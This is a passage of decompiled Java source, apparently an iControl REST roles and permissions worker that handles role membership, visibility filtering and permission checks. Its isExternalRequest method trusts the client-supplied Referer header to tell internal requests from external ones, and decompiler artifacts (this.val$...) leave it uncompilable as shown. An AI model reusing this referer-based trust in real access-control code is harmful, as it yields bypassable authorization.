ConcurrentHashMap<>();\r\n\r\n\r\n\r\n   private TmosRoleCache tmosRoleCache;\r\n\r\n\r\n   ConcurrentLinkedQueue<RestReference> usersToRemove = new ConcurrentLinkedQueue<>();\r\n   AtomicBoolean isUserRemovalRunning = new AtomicBoolean();\r\n\r\n   private final RoleResourceGroupWorker resourcesGroupWorker;\r\n   private final EffectivePermissionsWorker effectivePermissionsWorker;\r\n\r\n   public RolesWorker() {\r\n     super(RolesWorkerState.class, RolesCollectionState.class);\r\n     this.resourcesGroupWorker = new RoleResourceGroupWorker(this);\r\n     this.effectivePermissionsWorker = new EffectivePermissionsWorker(this);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public void onStart(RestServer server) throws Exception {\r\n     EvaluatePermissions.setRolesWorker(this, server.getPort());\r\n\r\n     this.tmosRoleCache = new TmosRoleCache(server.getPort());\r\n     setIdempotentPostEnabled(true);\r\n     setFullStateRequiredOnStart(true);\r\n     setMaxPendingOperations(10000L);\r\n\r\n     URI subscriptionsUri = makeLocalUri(SubscriptionWorker.ALREADY_STARTED_WORKER_URI_PATH);\r\n     URI publicationsUri = makeLocalUri(\"shared/publisher\");\r\n     URI tmosRoleUri = makeLocalUri(TmosRoleWorkerState.WORKER_PATH);\r\n     URI localRolesUri = makeLocalUri(TmosLocalRolesWorkerState.WORKER_PATH);\r\n\r\n     URI resourceGroupWorkerUri = getServer().registerWorkerUri(WellKnownPorts.AUTHZ_RESOURCE_GROUPS_WORKER_URI_PATH, (RestWorker)this.resourcesGroupWorker);\r\n\r\n\r\n     URI effectivePermissionWorkerUri = getServer().registerWorkerUri(WellKnownPorts.AUTHZ_EFFECTIVE_PERMISSIONS_WORKER_URI_PATH, (RestWorker)this.effectivePermissionsWorker);\r\n\r\n\r\n\r\n     completeStart(this.collectionClass, new URI[] { resourceGroupWorkerUri, effectivePermissionWorkerUri, tmosRoleUri, localRolesUri, subscriptionsUri, publicationsUri });\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   protected void onStartCompleted(Object loadedState, Exception stateLoadEx, Exception availabilityEx) throws Exception {\r\n     RolesCollectionState collectionState = (RolesCollectionState)loadedState;\r\n\r\n     for (RolesWorkerState role : collectionState.items) {\r\n       addRole(role);\r\n     }\r\n\r\n\r\n\r\n     RestRequestCompletion notificationCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation)\r\n         {\r\n           if (operation.getMethod() != RestOperation.RestMethod.DELETE) {\r\n             return;\r\n           }\r\n\r\n           RestResolverGroupEntry entry = (RestResolverGroupEntry)operation.getTypedBody(RestResolverGroupEntry.class);\r\n           for (RestReference ref : entry.references) {\r\n             RolesWorker.this.queueUserRemoval(ref);\r\n           }\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, RestOperation operation) {\r\n           RolesWorker.this.getLogger().severeFmt(\"%s\", new Object[] { ex.getMessage() });\r\n         }\r\n       };\r\n\r\n\r\n     RestRequestCompletion subscribeCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().warningFmt(\"Failed to subscribe to worker: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           RolesWorker.this.getLogger().fineFmt(\"Successfully subscribed to %s\", new Object[] { operation.getUri().getPath() });\r\n         }\r\n       };\r\n\r\n     AuthzHelper.subscribeToUsers(getServer(), subscribeCompletion, notificationCompletion);\r\n\r\n     AuthzHelper.subscribeToUserGroups(getServer(), subscribeCompletion, notificationCompletion);\r\n\r\n\r\n\r\n\r\n\r\n     RestRequestCompletion resourceGroupNotificationCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation)\r\n         {\r\n           if (operation.getMethod() != RestOperation.RestMethod.DELETE) {\r\n             return;\r\n           }\r\n           RoleResourceGroupState groupState = (RoleResourceGroupState)operation.getTypedBody(RoleResourceGroupState.class);\r\n\r\n           RolesWorker.this.removeResourceGroupsFromRoles(new RestReference(groupState.selfLink));\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, RestOperation operation) {\r\n           RolesWorker.this.getLogger().severeFmt(\"%s\", new Object[] { ex.getMessage() });\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation subscribeRequest = RestOperation.create().setUri(buildLocalUri(new String[] { WellKnownPorts.AUTHZ_RESOURCE_GROUPS_WORKER_URI_PATH })).setCompletion(subscribeCompletion);\r\n\r\n\r\n\r\n     sendPostForSubscription(subscribeRequest, getServer(), resourceGroupNotificationCompletion);\r\n\r\n\r\n\r\n     super.onStartCompleted(loadedState, stateLoadEx, availabilityEx);\r\n\r\n     removeStaleResourceGroups(collectionState);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private void removeStaleResourceGroups(final RolesCollectionState rolesCollection) {\r\n     RestRequestCompletion getCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().warningFmt(\"Failed to clean up stale resource groups: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           RoleResourceGroupCollection groupCollection = (RoleResourceGroupCollection)operation.getTypedBody(RoleResourceGroupCollection.class);\r\n\r\n\r\n           Set<URI> groupUris = new HashSet<>();\r\n           for (RoleResourceGroupState group : groupCollection.items) {\r\n             groupUris.add(group.selfLink);\r\n           }\r\n\r\n           for (RolesWorkerState role : rolesCollection.items) {\r\n             boolean needsUpdate = false;\r\n             if (role.resourceGroupReferences != null) {\r\n               Iterator<RestReference> iter = role.resourceGroupReferences.iterator();\r\n               while (iter.hasNext()) {\r\n                 if (!groupUris.contains(((RestReference)iter.next()).link)) {\r\n                   iter.remove();\r\n                   needsUpdate = true;\r\n                 }\r\n               }\r\n             }\r\n\r\n             if (needsUpdate) {\r\n               RolesWorker.this.putRole(role);\r\n             }\r\n           }\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation get = RestOperation.create().setUri(makeLocalUri(WellKnownPorts.AUTHZ_RESOURCE_GROUPS_WORKER_URI_PATH)).setCompletion(getCompletion);\r\n\r\n\r\n     sendGet(get);\r\n   }\r\n\r\n   private void putRole(final RolesWorkerState role) {\r\n     RestRequestCompletion updateCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().warningFmt(\"Failed to update role %s: %s\", new Object[] { this.val$role.name, RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           RolesWorker.this.getLogger().fineFmt(\"Successfully update role: %s\", new Object[] { this.val$role.name });\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation op = RestOperation.create().setUri(makeLocalUri(role.selfLink)).setBody(role).setCompletion(updateCompletion);\r\n\r\n     sendPut(op);\r\n   }\r\n\r\n\r\n   public void onGet(final RestOperation request) {\r\n     final String destinationRoleName = getItemIdFromRequest(request);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n     RestReference userReference = request.getAuthUserReference();\r\n     if (userReference == null || AuthzHelper.isDefaultAdminRef(userReference)) {\r\n       super.onGet(request);\r\n\r\n       return;\r\n     }\r\n     hasAdminRole(request, new CompletionHandler<Boolean>()\r\n         {\r\n           public void completed(Boolean isAdmin)\r\n           {\r\n             if (isAdmin != null && isAdmin.booleanValue()) {\r\n               RolesWorker.this.onGet(request);\r\n\r\n               return;\r\n             }\r\n             if (RolesWorker.this.hasVisibilityToRole(request, destinationRoleName)) {\r\n               RolesWorker.this.onGet(request);\r\n\r\n               return;\r\n             }\r\n             if (destinationRoleName != null) {\r\n\r\n               String error = String.format(\"Authorization failed: userReference [%s] is not a member of role [%s].\", new Object[] { (this.val$request.getAuthUserReference()).link, this.val$destinationRoleName });\r\n\r\n\r\n               request.setStatusCode(401);\r\n               request.fail(new SecurityException(error));\r\n\r\n               return;\r\n             }\r\n             RolesWorker.this.onGet(request);\r\n           }\r\n\r\n\r\n           public void failed(Exception ex, Boolean isAdmin) {\r\n             RolesWorker.failWithPermissionsInternalError(request);\r\n           }\r\n         });\r\n   }\r\n\r\n\r\n   private boolean hasVisibilityToRole(RestOperation request, String destinationRoleName) {\r\n     for (RestReference identityRef : request.getAuthIdentityReferences()) {\r\n\r\n\r\n\r\n\r\n\r\n       if (!this.userLinkToRoleNames.containsKey(identityRef)) {\r\n         continue;\r\n       }\r\n\r\n       synchronized (this.userLinkToRoleNames) {\r\n         Set<String> roleNames = this.userLinkToRoleNames.get(identityRef);\r\n\r\n\r\n         if (roleNames.contains(destinationRoleName)) {\r\n           return true;\r\n         }\r\n\r\n\r\n         for (String roleName : roleNames) {\r\n           RoleResourceMatcher resources = this.roleNameToResources.get(roleName);\r\n           String destinationRoleUriPath = (destinationRoleName == null) ? EXTERNAL_ROLES_WORKER_URI_PATH : UrlHelper.buildUriPath(new String[] { EXTERNAL_ROLES_WORKER_URI_PATH, destinationRoleName });\r\n\r\n\r\n           if (resources.verifyResourceIsPermitted(destinationRoleUriPath, RestOperation.RestMethod.GET)) {\r\n             return true;\r\n           }\r\n         }\r\n       }\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n   public boolean hasVisibilityToResourceGroup(RestOperation request, RestReference resourceGroupRef) {\r\n     for (RestReference identityRef : request.getAuthIdentityReferences()) {\r\n\r\n\r\n\r\n\r\n\r\n       if (!this.userLinkToRoleNames.containsKey(identityRef)) {\r\n         continue;\r\n       }\r\n\r\n       synchronized (this.userLinkToRoleNames) {\r\n\r\n         Set<String> roleNames = this.userLinkToRoleNames.get(identityRef);\r\n\r\n\r\n         if (null == roleNames || roleNames.isEmpty()) {\r\n           continue;\r\n         }\r\n\r\n\r\n         Set<String> rolesWithResourceGroup = this.resourceGroupToRoleNames.get(resourceGroupRef);\r\n         if (null != rolesWithResourceGroup) {\r\n           for (String roleName : rolesWithResourceGroup) {\r\n             if (roleNames.contains(roleName)) {\r\n               return true;\r\n             }\r\n           }\r\n         }\r\n\r\n\r\n         for (String roleName : roleNames) {\r\n           RoleResourceMatcher resources = this.roleNameToResources.get(roleName);\r\n           if (resources.verifyResourceIsPermitted(resourceGroupRef.link.getPath(), RestOperation.RestMethod.GET)) {\r\n             return true;\r\n           }\r\n         }\r\n       }\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setGetCollectionBodyAsync(RestOperation getRequest, RestOperation loadRequest, CompletionHandler<Void> completion) {\r\n     String destinationRoleName = getItemIdFromRequest(getRequest);\r\n     if (destinationRoleName == null || destinationRoleName.equals(\"Administrator\")) {\r\n       getBuiltInRoleUserReferences(getRequest, loadRequest, completion);\r\n     } else {\r\n       continueSetGetCollectionBody(getRequest, loadRequest, completion);\r\n     }\r\n   }\r\n\r\n\r\n   private void getBuiltInRoleUserReferences(final RestOperation getRequest, final RestOperation loadRequest, final CompletionHandler<Void> finalCompletion) {\r\n     final String roleName = getItemIdFromRequest(getRequest);\r\n     RestRequestCompletion completion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation response)\r\n         {\r\n           RolesWorker.populateAdminUserReferencesOnGet(roleName, loadRequest, response);\r\n           RolesWorker.this.continueSetGetCollectionBody(getRequest, loadRequest, finalCompletion);\r\n         }\r\n\r\n\r\n\r\n         public void failed(Exception ex, RestOperation response) {\r\n           RolesWorker.this.getLogger().fineFmt(\"Unable to get list of admins/non-admins: %s\", new Object[] { ex.getMessage() });\r\n\r\n           getRequest.fail(ex);\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation request = RestOperation.create().setUri(makeLocalUri(TmosLocalRolesWorkerState.WORKER_PATH)).setAdminIdentity().setCompletion(completion);\r\n\r\n\r\n\r\n\r\n     sendGet(request);\r\n   }\r\n\r\n\r\n   static void populateAdminUserReferencesOnGet(String destinationRole, RestOperation request, RestOperation LocalRolesResponse) {\r\n     RolesCollectionState collection = null;\r\n     RolesWorkerState adminRole = null;\r\n\r\n     if (destinationRole == null) {\r\n       collection = (RolesCollectionState)request.getTypedBody(RolesCollectionState.class);\r\n       for (RolesWorkerState role : collection.items) {\r\n         if (\"Administrator\".equals(role.name)) {\r\n           adminRole = role;\r\n         }\r\n       }\r\n     } else if (destinationRole.equals(\"Administrator\")) {\r\n       adminRole = (RolesWorkerState)request.getTypedBody(RolesWorkerState.class);\r\n     }\r\n\r\n     String localUsersPath = UrlHelper.makePublicPath(WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH);\r\n     TmosLocalRolesWorkerState localState = (TmosLocalRolesWorkerState)LocalRolesResponse.getTypedBody(TmosLocalRolesWorkerState.class);\r\n\r\n\r\n     if (adminRole != null) {\r\n       if (adminRole.userReferences == null) {\r\n         adminRole.userReferences = new HashSet<>();\r\n       }\r\n\r\n\r\n\r\n       Iterator<RestReference> it = adminRole.userReferences.iterator();\r\n       while (it.hasNext()) {\r\n         RestReference userRef = it.next();\r\n         if (userRef.link.getPath().startsWith(localUsersPath)) {\r\n           it.remove();\r\n         }\r\n       }\r\n\r\n\r\n       for (String user : localState.administrators) {\r\n         String userPath = UrlHelper.buildUriPath(new String[] { localUsersPath, user });\r\n\r\n         adminRole.userReferences.add(new RestReference(UrlHelper.buildPublicUri(userPath)));\r\n       }\r\n\r\n       if (adminRole.userReferences.isEmpty()) {\r\n         adminRole.userReferences = null;\r\n       }\r\n     }\r\n\r\n     if (destinationRole == null) {\r\n       request.setBody(collection);\r\n     } else if (destinationRole.equals(\"Administrator\")) {\r\n       request.setBody(adminRole);\r\n     }\r\n   }\r\n\r\n\r\n\r\n   private void continueSetGetCollectionBody(final RestOperation getRequest, final RestOperation loadRequest, final CompletionHandler<Void> completion) {\r\n     String destinationRoleName = getItemIdFromRequest(getRequest);\r\n     if (destinationRoleName != null) {\r\n       super.setGetCollectionBodyAsync(getRequest, loadRequest, completion);\r\n\r\n\r\n       return;\r\n     }\r\n\r\n     RestReference userReference = getRequest.getAuthUserReference();\r\n     if (userReference == null || AuthzHelper.isDefaultAdminRef(userReference)) {\r\n       super.setGetCollectionBodyAsync(getRequest, loadRequest, completion);\r\n\r\n\r\n       return;\r\n     }\r\n\r\n     hasAdminRole(getRequest, new CompletionHandler<Boolean>()\r\n         {\r\n           public void completed(Boolean isAdmin)\r\n           {\r\n             if (isAdmin != null && isAdmin.booleanValue()) {\r\n               RolesWorker.this.setGetCollectionBodyAsync(getRequest, loadRequest, completion);\r\n\r\n               return;\r\n             }\r\n             getRequest.setBody(RolesWorker.this.filterRoles(getRequest, loadRequest));\r\n             completion.completed(null);\r\n           }\r\n\r\n\r\n           public void failed(Exception ex, Boolean isAdmin) {\r\n             getRequest.setBody(null);\r\n             getRequest.setStatusCode(500);\r\n             completion.failed(new Exception(\"Internal server error while authorizing request\"), null);\r\n           }\r\n         });\r\n   }\r\n\r\n\r\n\r\n   private RolesCollectionState filterRoles(RestOperation getRequest, RestOperation loadRequest) {\r\n     RolesCollectionState roles = (RolesCollectionState)loadRequest.getTypedBody(RolesCollectionState.class);\r\n     Iterator<RolesWorkerState> iter = roles.items.iterator();\r\n     while (iter.hasNext()) {\r\n       if (!hasVisibilityToRole(getRequest, ((RolesWorkerState)iter.next()).name)) {\r\n         iter.remove();\r\n       }\r\n     }\r\n     return roles;\r\n   }\r\n\r\n\r\n   protected void onPatch(RestOperation request) {\r\n     getLogger().fineFmt(\"Attempting to PATCH role; uri: %s, referrer: %s\", new Object[] { request.getUri(), request.getReferer() });\r\n\r\n     if (isReadOnly(request)) {\r\n       return;\r\n     }\r\n\r\n     RestCollectionMergeResult<RolesWorkerState> mergeResult = getMergeResultFromRequest(request);\r\n\r\n\r\n     if (((RolesWorkerState)mergeResult.clientState).userReferences != null && ((RolesWorkerState)mergeResult.storageState).userReferences != null)\r\n     {\r\n       ((RolesWorkerState)mergeResult.mergedState).userReferences.addAll(((RolesWorkerState)mergeResult.storageState).userReferences);\r\n     }\r\n     if (((RolesWorkerState)mergeResult.clientState).resourceGroupReferences != null && ((RolesWorkerState)mergeResult.storageState).resourceGroupReferences != null)\r\n     {\r\n       ((RolesWorkerState)mergeResult.mergedState).resourceGroupReferences.addAll(((RolesWorkerState)mergeResult.storageState).resourceGroupReferences);\r\n     }\r\n\r\n     if (((RolesWorkerState)mergeResult.clientState).resources != null && ((RolesWorkerState)mergeResult.storageState).resources != null) {\r\n       ((RolesWorkerState)mergeResult.mergedState).resources.addAll(((RolesWorkerState)mergeResult.storageState).resources);\r\n     }\r\n     if (((RolesWorkerState)mergeResult.clientState).properties != null && ((RolesWorkerState)mergeResult.storageState).properties != null)\r\n     {\r\n       for (Map.Entry<String, Object> entry : ((RolesWorkerState)mergeResult.storageState).properties.entrySet()) {\r\n         if (!((RolesWorkerState)mergeResult.mergedState).properties.containsKey(entry.getKey())) {\r\n           ((RolesWorkerState)mergeResult.mergedState).properties.put(entry.getKey(), entry.getValue());\r\n         }\r\n       }\r\n     }\r\n\r\n     request.setBody(mergeResult.mergedState);\r\n     updateBuiltInRoleCacheOnDemand(request);\r\n   }\r\n\r\n\r\n   public void onPatchCompleted(RestOperation request) {\r\n     RolesWorkerState patchState = (RolesWorkerState)getStateFromRequest(request);\r\n     addRole(patchState);\r\n     request.complete();\r\n   }\r\n\r\n\r\n   protected void onPut(RestOperation request) {\r\n     getLogger().fineFmt(\"Attempting to PUT role; uri: %s, referrer: %s\", new Object[] { request.getUri().toString(), request.getReferer() });\r\n\r\n     if (isReadOnly(request)) {\r\n       return;\r\n     }\r\n     updateBuiltInRoleCacheOnDemand(request);\r\n   }\r\n\r\n   private RolesWorkerState getStateToUpdate(RestOperation request) {\r\n     if (request.getMethod().equals(RestOperation.RestMethod.PATCH)) {\r\n       RestCollectionMergeResult<RolesWorkerState> mergeResult = getMergeResultFromRequest(request);\r\n\r\n       return (RolesWorkerState)mergeResult.storageState;\r\n     }\r\n     return (RolesWorkerState)request.getTypedBody(RolesWorkerState.class);\r\n   }\r\n\r\n   private void updateBuiltInRoleCacheOnDemand(RestOperation incomingRequest) {\r\n     RolesWorkerState role = (RolesWorkerState)incomingRequest.getTypedBody(RolesWorkerState.class);\r\n\r\n     if (role.userReferences != null &&\r\n       \"Administrator\".equals(role.name)) {\r\n       updateLocalRolesWorker(incomingRequest, role);\r\n\r\n       return;\r\n     }\r\n\r\n     completeRequest(incomingRequest);\r\n   }\r\n\r\n   private void updateLocalRolesWorker(final RestOperation incomingRequest, RolesWorkerState role) {\r\n     final Set<URI> localAdminUris = collectLocalUserUris(role);\r\n     TmosLocalRolesWorkerState update = new TmosLocalRolesWorkerState();\r\n\r\n     RestRequestCompletion completion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation response)\r\n         {\r\n           Set<URI> remainingLocalAdminUris = new HashSet<>(localAdminUris);\r\n\r\n           for (Map.Entry<URI, Boolean> entry : RolesWorker.this.tmosRoleCache.getValues().entrySet()) {\r\n             if (entry.getValue() != Boolean.TRUE) {\r\n               continue;\r\n             }\r\n\r\n             if (!RolesWorker.isLocalUserReference(new RestReference(entry.getKey()))) {\r\n               continue;\r\n             }\r\n\r\n\r\n             if (!remainingLocalAdminUris.remove(entry.getKey())) {\r\n               RolesWorker.this.tmosRoleCache.putValue(entry.getKey(), Boolean.FALSE);\r\n             }\r\n           }\r\n\r\n           for (URI adminUri : remainingLocalAdminUris) {\r\n             RolesWorker.this.tmosRoleCache.putValue(adminUri, Boolean.TRUE);\r\n           }\r\n\r\n           RolesWorker.this.completeRequest(incomingRequest);\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, RestOperation response) {\r\n           RolesWorker.this.getLogger().fineFmt(\"Unable to update list of admins: %s\", new Object[] { ex.getMessage() });\r\n\r\n           incomingRequest.fail(ex);\r\n         }\r\n       };\r\n\r\n\r\n     for (URI adminUserRef : localAdminUris) {\r\n       update.administrators.add(UrlHelper.getLastPathSegment(adminUserRef.getPath()));\r\n     }\r\n\r\n     if (AuthzHelper.DEFAULT_ADMIN_NAME != null) {\r\n       if (!update.administrators.contains(AuthzHelper.DEFAULT_ADMIN_NAME)) {\r\n         update.administrators.add(AuthzHelper.DEFAULT_ADMIN_NAME);\r\n\r\n\r\n         role.userReferences.add(AuthzHelper.getDefaultAdminReference());\r\n       }\r\n       incomingRequest.setBody(role);\r\n     }\r\n\r\n     RestOperation request = RestOperation.create().setUri(makeLocalUri(TmosLocalRolesWorkerState.WORKER_PATH)).setAdminIdentity().setBody(update).setCompletion(completion);\r\n\r\n\r\n\r\n\r\n\r\n     sendPost(request);\r\n   }\r\n\r\n   private static Set<URI> collectLocalUserUris(RolesWorkerState roleState) {\r\n     Set<URI> userUris = new HashSet<>();\r\n     for (RestReference userReference : roleState.userReferences) {\r\n       if (RestReference.isNullOrEmpty(userReference)) {\r\n         continue;\r\n       }\r\n\r\n\r\n\r\n       if (!isLocalUserReference(userReference)) {\r\n         continue;\r\n       }\r\n       userUris.add(userReference.link);\r\n     }\r\n     return userUris;\r\n   }\r\n\r\n   private static boolean isLocalUserReference(RestReference userReference) {\r\n     return userReference.link.getPath().startsWith(LOCAL_USERS_PATH);\r\n   }\r\n\r\n\r\n   public void onPutCompleted(RestOperation request) {\r\n     RolesWorkerState putState = (RolesWorkerState)getStateFromRequest(request);\r\n     addRole(putState);\r\n     request.complete();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private void addRole(RolesWorkerState postedItem) {\r\n     synchronized (this.userLinkToRoleNames) {\r\n\r\n\r\n\r\n       this.roleNameToResources.put(postedItem.name, buildResourcesList(postedItem));\r\n\r\n\r\n\r\n       if (postedItem.userReferences != null) {\r\n         addRolesToUsers(postedItem.name, postedItem.userReferences);\r\n       }\r\n       if (postedItem.resourceGroupReferences != null) {\r\n         addRolesToResourceGroups(postedItem.name, postedItem.resourceGroupReferences);\r\n       }\r\n\r\n\r\n       for (Map.Entry<RestReference, Set<String>> entry : this.userLinkToRoleNames.entrySet()) {\r\n\r\n         if (((Set)entry.getValue()).contains(postedItem.name) && (postedItem.userReferences == null || !postedItem.userReferences.contains(entry.getKey())))\r\n         {\r\n\r\n           ((Set)entry.getValue()).remove(postedItem.name);\r\n         }\r\n       }\r\n\r\n       for (Map.Entry<RestReference, Set<String>> entry : this.resourceGroupToRoleNames.entrySet()) {\r\n\r\n         if (((Set)entry.getValue()).contains(postedItem.name) && (postedItem.resourceGroupReferences == null || !postedItem.resourceGroupReferences.contains(entry.getKey())))\r\n         {\r\n\r\n           ((Set)entry.getValue()).remove(postedItem.name);\r\n         }\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n   private void addRolesToUsers(String roleName, Set<RestReference> users) {\r\n     for (RestReference userReference : users) {\r\n       if (userReference.link == null) {\r\n         getLogger().warningFmt(\"Null userReference in role %s\", new Object[] { roleName });\r\n         continue;\r\n       }\r\n       getLogger().finestFmt(\"Adding role %s from %s\", new Object[] { roleName, userReference.link.toString() });\r\n\r\n       if (this.userLinkToRoleNames.containsKey(userReference)) {\r\n         ((Set<String>)this.userLinkToRoleNames.get(userReference)).add(roleName);\r\n         continue;\r\n       }\r\n       Set<String> roleSet = new HashSet<>();\r\n       roleSet.add(roleName);\r\n       this.userLinkToRoleNames.put(userReference, roleSet);\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   private void addRolesToResourceGroups(String roleName, Set<RestReference> resourceGroups) {\r\n     for (RestReference resourceGroup : resourceGroups) {\r\n       if (resourceGroup.link == null) {\r\n         getLogger().warningFmt(\"Null userReference in role %s\", new Object[] { roleName });\r\n         continue;\r\n       }\r\n       getLogger().finestFmt(\"Adding role %s to %s\", new Object[] { roleName, resourceGroup.link.toString() });\r\n\r\n       if (this.resourceGroupToRoleNames.containsKey(resourceGroup)) {\r\n         ((Set<String>)this.resourceGroupToRoleNames.get(resourceGroup)).add(roleName);\r\n         continue;\r\n       }\r\n       Set<String> roleSet = new HashSet<>();\r\n       roleSet.add(roleName);\r\n       this.resourceGroupToRoleNames.put(resourceGroup, roleSet);\r\n     }\r\n   }\r\n\r\n\r\n\r\n   private void removeRolesFromUsers(String roleName, Set<RestReference> users) {\r\n     for (RestReference userReference : users) {\r\n       if (userReference.link == null) {\r\n         continue;\r\n       }\r\n       if (this.userLinkToRoleNames.containsKey(userReference)) {\r\n         getLogger().finestFmt(\"Removing role %s from %s\", new Object[] { roleName, userReference.link.toString() });\r\n\r\n         ((Set)this.userLinkToRoleNames.get(userReference)).remove(roleName);\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   private void removeRolesFromResourceGroups(String roleName, Set<RestReference> resourceGroups) {\r\n     for (RestReference groupReference : resourceGroups) {\r\n       if (groupReference.link == null) {\r\n         continue;\r\n       }\r\n       if (this.resourceGroupToRoleNames.containsKey(groupReference)) {\r\n         getLogger().finestFmt(\"Removing role %s from %s\", new Object[] { roleName, groupReference.link.toString() });\r\n\r\n         ((Set)this.resourceGroupToRoleNames.get(groupReference)).remove(roleName);\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n   public void onDelete(RestOperation request) {\r\n     getLogger().fineFmt(\"Attempting to DELETE role; uri: %s, referrer: %s\", new Object[] { request.getUri().toString(), request.getReferer() });\r\n\r\n     if (isReadOnly(request)) {\r\n       return;\r\n     }\r\n     completeDelete(request);\r\n   }\r\n\r\n\r\n   public void onDeleteCompleted(RestOperation request) {\r\n     RolesWorkerState item = (RolesWorkerState)getStateFromRequest(request);\r\n\r\n     synchronized (this.userLinkToRoleNames) {\r\n       if (item.userReferences != null) {\r\n         removeRolesFromUsers(item.name, item.userReferences);\r\n       }\r\n\r\n\r\n       if (item.resourceGroupReferences != null) {\r\n         removeRolesFromResourceGroups(item.name, item.resourceGroupReferences);\r\n       }\r\n\r\n       this.roleNameToResources.remove(item.name);\r\n     }\r\n\r\n     request.complete();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void onPost(RestOperation request) {\r\n     getLogger().fineFmt(\"Attempting to POST role; uri: %s, referrer: %s\", new Object[] { request.getUri().toString(), request.getReferer() });\r\n\r\n     updateBuiltInRoleCacheOnDemand(request);\r\n   }\r\n\r\n\r\n   public void onPostCompleted(RestOperation request) {\r\n     RolesWorkerState postedItem = (RolesWorkerState)getStateFromRequest(request);\r\n     addRole(postedItem);\r\n     request.complete();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private boolean isReadOnly(RestOperation request) {\r\n     if (!isExternalRequest(request)) {\r\n       return false;\r\n     }\r\n\r\n     RolesWorkerState updateState = getStateToUpdate(request);\r\n     if (request.getMethod().equals(RestOperation.RestMethod.DELETE) && (updateState.name.equals(\"iControl_REST_API_User\") || updateState.name.equals(\"Administrator\"))) {\r\n\r\n\r\n\r\n       request.fail(new IllegalStateException(String.format(\"Cannot %s built in roles.\", new Object[] { \"delete\" })));\r\n\r\n       return true;\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static boolean isExternalRequest(RestOperation request) {\r\n     return (request.getReferer() != null && !request.getReferer().endsWith(TmosBuiltInRolesWorkerState.WORKER_PATH) && !request.getReferer().contains(RemoteStateCopier.class.getName()) && !request.getReferer().contains(\"shared/gossip\") && !request.getReferer().endsWith(WellKnownPorts.AUTHZ_TMOS_ROLES_SYNC_WORKER_URI_PATH));\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void evaluatePermission(final RestOperation request, final String path, final RestOperation.RestMethod verb, final CompletionHandler<Boolean> completion) {\r\n     if (isAllowedToAll(path, verb)) {\r\n       completion.completed(Boolean.valueOf(true));\r\n\r\n       return;\r\n     }\r\n     hasAdminRole(request, new CompletionHandler<Boolean>()\r\n         {\r\n           public void completed(Boolean isAdmin)\r\n           {\r\n             if (isAdmin != null && isAdmin.booleanValue()) {\r\n               completion.completed(Boolean.valueOf(true));\r\n\r\n               return;\r\n             }\r\n             completion.completed(Boolean.valueOf(RolesWorker.this.evaluatePermission(request, path, verb)));\r\n           }\r\n\r\n\r\n           public void failed(Exception ex, Boolean isAdmin) {\r\n             completion.failed(ex, Boolean.valueOf(false));\r\n           }\r\n         });\r\n   }\r\n\r\n\r\n\r\n\r\n   private static boolean isAllowedToAll(String path, RestOperation.RestMethod verb) {\r\n     if (verb == RestOperation.RestMethod.POST && (path.equals(EXTERNAL_EFFECTIVE_PERMISSIONS_WORKER_PATH) || path.startsWith(EXTERNAL_LOGIN_WORKER_PATH)))\r\n     {\r\n\r\n       return true;\r\n     }\r\n\r\n\r\n\r\n\r\n     if (verb == RestOperation.RestMethod.GET && (path.startsWith(EXTERNAL_ROLES_WORKER_URI_PATH) || path.startsWith(EXTERNAL_RESOURCE_GROUPS_WORKER_URI_PATH)))\r\n     {\r\n\r\n       return true;\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n   private boolean evaluatePermission(RestOperation request, String path, RestOperation.RestMethod verb) {\r\n     for (RestReference identityReference : request.getAuthIdentityReferences()) {\r\n       if (evaluatePermission(identityReference, path, verb)) {\r\n         return true;\r\n       }\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n   private boolean evaluatePermission(RestReference userLink, String path, RestOperation.RestMethod verb) {\r\n     if (path.equals(userLink.link.getPath())) {\r\n       return true;\r\n     }\r\n\r\n\r\n\r\n\r\n     if 